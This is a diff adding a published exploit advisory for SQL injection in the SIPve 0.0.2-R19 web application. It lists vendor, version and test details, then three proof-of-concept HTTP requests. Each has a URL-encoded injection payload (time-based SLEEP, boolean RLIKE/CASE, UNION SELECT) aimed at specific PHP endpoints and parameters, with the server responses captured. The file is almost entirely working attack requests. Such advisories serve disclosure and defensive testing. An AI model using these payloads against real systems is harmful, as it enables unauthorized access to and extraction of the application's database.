@@ -1,0 +1,81 @@
+# Exploit Title: SIPve 0.0.2-R19 - SQL Injection
+# Dork: N/A
+# Date: 2018-11-11
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://sourceforge.net/projects/sipve/
+# Software Link: https://datapacket.dl.sourceforge.net/project/sipve/sipve-v0.0.2-R19.tar.gz
+# Version: 0.0.2-R19
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/monitorasoc/view/monitorasocAcc.php?usuario=[SQL]&accion=asociar
+# 
+GET /[PATH]/monitorasoc/view/monitorasocAcc.php?usuario=%31%27%20%41%4e%44%20%28%53%45%4c%45%43%54%20%2a%20%46%52%4f%4d%20%28%53%45%4c%45%43%54%28%53%4c%45%45%50%28%35%29%29%29%45%66%65%29%2d%2d%20%45%66%65&accion=asociar HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=p5kifla1c6ge33dkui0eijm2e2
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 11 Nov 2018 18:56:49 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Sat, 26 Jul 1997 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate
+Pragma: no-cache
+Keep-Alive: timeout=5, max=94
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 2)
+# http://localhost/[PATH]/grupo/view/getGrupoFuncionLoaded.php?idgrupo=[SQL]&accion=1
+# 
+GET /[PATH]/grupo/view/getGrupoFuncionLoaded.php?idgrupo=%31%27%29%20%52%4c%49%4b%45%20%28%53%45%4c%45%43%54%20%28%43%41%53%45%20%57%48%45%4e%20%28%36%36%3d%36%36%29%20%54%48%45%4e%20%31%20%45%4c%53%45%20%30%78%32%38%20%45%4e%44%29%29%2d%2d%20%45%66%65&accion=1 HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=p5kifla1c6ge33dkui0eijm2e2
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 11 Nov 2018 18:58:53 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Cache-Control: no-cache, must-revalidate
+Expires: Sat, 26 Jul 1997 05:00:00 GMT
+Keep-Alive: timeout=5, max=91
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+# POC: 
+# 3)
+# http://localhost/[PATH]/monitorremoto/view/setStatusEvento.php?idevento=[SQL]
+# 
+GET /[PATH]/monitorremoto/view/setStatusEvento.php?idevento=%2d%31%27%20%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%31%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=p5kifla1c6ge33dkui0eijm2e2
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Sun, 11 Nov 2018 19:01:04 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
